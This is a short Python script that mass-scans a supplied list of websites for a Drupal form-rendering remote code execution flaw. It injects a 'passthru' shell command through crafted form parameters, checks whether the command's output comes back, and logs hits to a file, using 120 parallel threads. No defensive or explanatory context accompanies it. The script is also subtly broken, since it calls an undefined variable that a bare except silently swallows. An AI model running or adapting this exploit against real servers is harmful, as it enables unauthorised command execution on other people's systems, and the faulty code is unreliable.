# -*- coding: utf-8 -*-
#!/usr/bin/env python3

import sys
import requests
import re
from multiprocessing.dummy import Pool

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('noob: pd.py list.txt')

def chips(yeah):
    try:
        url=yeah
        pour_get = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'echo omelette', 'name[#type]':'markup'}
        pour_post = {'form_id':'user_pass', '_triggering_element_name':'name'}
        r = requests.post(url, data=pour_post, params=pour_get,verify=False)
        match = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if match:
            found = m.group(1)
            pour_get = {'q':'file/ajax/name/#value/' + found}
            pour_post = {'form_build_id':found}
            r = requests.post(url, data=pour_post, params=pour_get,verify=False)
            if("omelette" in r.text):
                open("bvfrero","a").write(yeah+"\n")
                print(yeah, " -> Vuln frr")
            else:
                print(yeah, " -> Nan")  
    except:
        pass

mp = Pool(120)
mp.map(chips, target)
mp.close()
mp.join()
